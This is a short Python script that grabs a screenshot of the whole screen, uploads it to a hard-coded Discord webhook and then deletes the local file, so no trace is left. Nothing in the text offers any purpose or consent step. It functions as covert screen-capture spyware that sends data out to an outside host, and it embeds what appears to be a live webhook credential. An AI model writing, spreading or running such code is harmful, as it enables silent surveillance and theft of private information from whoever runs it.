import time
import os
import requests
from PIL import ImageGrab
WEBHOOK_URL = "https://discord.com/api/webhooks/1133460697171361843/3WKh_8uI95Y9AQnkM7vub3ZHRJaNMLKJnjMZodVh5Mp5dbD2RDdRy_HE8l2F1pbELoSU"
screenshot = ImageGrab.grab()
screenshot_filename = "screenshot.png"
screenshot.save(screenshot_filename)
with open(screenshot_filename, "rb") as f:
    file = {"file": f}
    payload = {"content": ""}
    r = requests.post(WEBHOOK_URL, data=payload, files=file)
os.remove(screenshot_filename)
